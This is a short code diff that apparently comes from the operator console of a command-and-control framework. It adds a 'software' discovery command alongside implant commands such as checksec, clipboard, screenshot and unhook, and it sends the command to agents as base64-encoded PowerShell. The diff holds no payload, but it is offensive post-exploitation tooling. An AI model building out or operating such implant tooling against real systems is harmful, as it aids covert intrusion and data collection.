@@ -35,6 +35,7 @@ agent_completer = NestedCompleter.from_nested_dict({
     'upload ': None,
     'pstree': None,
     'checksec': None,
+    'software': None,
     'clipboard': None,
     'screenshot': None,
     'unhook': None,
@@ -160,6 +161,7 @@ def print_agent_help():
     --== Discovery Stuff ==--
     pstree                                 ->  show process tree
     checksec                               ->  check for security products
+    software                               ->  check for installed software
     
     --== Collection Stuff ==--
     clipboard                              ->  retrieve clipboard
@@ -250,7 +252,7 @@ def agent_screen(agent_id):
                 }
 
             # handle ps_modules
-            elif re.fullmatch(r"\s*(pstree)\s*", command):
+            elif re.fullmatch(r"\s*(pstree|software)\s*", command):
                 ps_module = command.replace(" ", "")
                 powershell_command = getattr(ps_modules, ps_module)
                 encoded_powershell_command = utils.encode_base_64(powershell_command)
